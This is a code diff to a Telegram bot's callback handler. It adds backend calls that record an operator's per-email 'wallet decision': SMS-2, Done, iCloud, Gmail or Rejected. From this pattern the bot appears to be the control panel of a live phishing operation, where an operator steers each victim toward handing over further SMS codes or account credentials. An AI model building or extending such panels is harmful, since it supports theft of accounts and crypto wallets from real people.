@@ -355,12 +355,52 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been <b>Rejected</b> ❌`;
       } else if (action === "wallet_decision_sms") {
         statusMessage = `📧 <code>${email}</code> → <b>SMS - 2</b> 💬`;
+        // ✅ Call backend to store choice
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: "wallet_decision_sms" })
+          });
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
       } else if (action === "wallet_decision_done") {
         statusMessage = `📧 <code>${email}</code> → <b>Done</b> 🏁`;
+        // ✅ Call backend to store choice
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: "wallet_decision_done" })
+          });
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
       } else if (action === "wallet_decision_icloud") {
         statusMessage = `📧 <code>${email}</code> → ☁️`;
+        // ✅ Call backend to store choice
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: "wallet_decision_icloud" })
+          });
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
       } else if (action === "wallet_decision_gmail") {
         statusMessage = `📧 <code>${email}</code> → 🌈`;
+        // ✅ Call backend to store choice
+        try {
+          await fetch(`${APP_URL}/update-wallet-decision`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, choice: "wallet_decision_gmail" })
+          });
+        } catch (err) {
+          console.error("Error updating wallet decision:", err);
+        }
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
